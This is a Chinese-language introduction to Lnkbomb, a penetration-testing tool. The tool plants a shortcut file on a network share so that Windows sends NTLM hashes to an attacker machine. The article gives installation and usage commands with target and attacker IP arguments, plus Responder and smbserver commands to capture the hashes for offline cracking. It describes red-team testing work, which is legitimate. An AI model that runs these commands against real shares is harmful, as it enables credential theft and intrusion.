![](https://image.3001.net/images/20220318/1647607611_62347f3b78946161038c7.jpeg!small)

## 关于Lnkbomb

在很多情况下，内外部网络系统中文件共享的安全问题经常会被管理员所忽略。Lnkbomb作为一款功能强大的安全测试工具，可以帮助广大研究人员通过生成安全测试用的快捷方式，并尝试从目标文件共享中收集NTLM哈希来测试文件共享的安全性能。

## 工具运行机制

首先，Lnkbomb可以生成一个用于测试的快捷方式文件，并将其上传到目标（不安全）的文件共享。接下来根据Windows操作系统的运行机制，Windows系统将会寻找一个跟该快捷方式文件相关联的图标文件。这个图标文件将能够定向到运行了Responder或smbserver之类工具的安全测试设备上，以实现NTLMv1或NTLMv2哈希的收集操作，具体将取决于目标主机的配置。最后，安全研究人员就可以使用Hashcat之类的工具尝试对其进行离线破解了。

在整个过程中，安全研究人员需要在Payload文件中写入目标设备的IP地址，然后直接将Payload文件通过命令行工具上传到目标文件共享中。

## 工具安装

该工具基于Python 3开发，因此我们首先需要在本地设备上安装并配置好Python 3环境。

接下来，广大研究人员就可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/dievus/lnkbomb.git

注意：该工具在Windows平台上可以正常运行，在Linux平台上运行可能会遇到一些问题。

## 工具使用

打开命令行工具，切换到项目根目录后，运行下列命令即可查看工具的帮助信息：

    
    
    python3 lnkbomb.py -h

上述命令将打开工具的帮助菜单，其中将包含下列参数选项：

> -h, --help：查看工具帮助选项
>
>  
>
>
> -t, --target：指定目标文件共享位置，例如 -t \\\192.168.1.1\Share
>
>  
>
>
> -a, --attacker：指定测试人员的设备地址，例如 -a 192.168.1.2
>
>  
>
>
> -r, --recover：测试完成后，移除Payload文件，例如 -r randomfilegenerated.recover

## 工具使用样例

### 样例1

python3 lnkbomb.py -t \\\192.168.1.1\Share -a 192.168.1.2

### 样例2

python3 lnkbomb.py -r randomfilegenerated.recover

### 样例3

如果你需要使用Responder或smbserver之类的工具来捕捉NTLM哈希的话，可以运行下列命令：

    
    
    responder -I eth0 -dwf -v

或：

    
    
    smbserver.py . . -smb2support

## 使用可执行文件

广大研究人员也可以直接从该项目的【[
_Releases页面_](https://github.com/dievus/lnkbomb/releases/tag/v1.0)】下载Lnkbomb已编译好的可执行文件，所有的运行参数选项和命令行工具的使用是一样的，只不过运行的时候是通过双击lnkbomb.exe实现，而不是运行“python3
lnkbomb.py”命令。

## 工具运行截图

![](https://image.3001.net/images/20220318/1647607664_62347f70070104c237bd1.png!small)

![](https://image.3001.net/images/20220318/1647607669_62347f75eeef0dd4e1b2d.png!small)

## 许可证协议

本项目的开发与发布遵循[
_MIT_](https://github.com/dievus/lnkbomb/blob/main/LICENSE)开源许可证协议。

## 项目地址

 **Lnkbomb：** 【[ _GitHub传送门_](https://github.com/dievus/lnkbomb)】

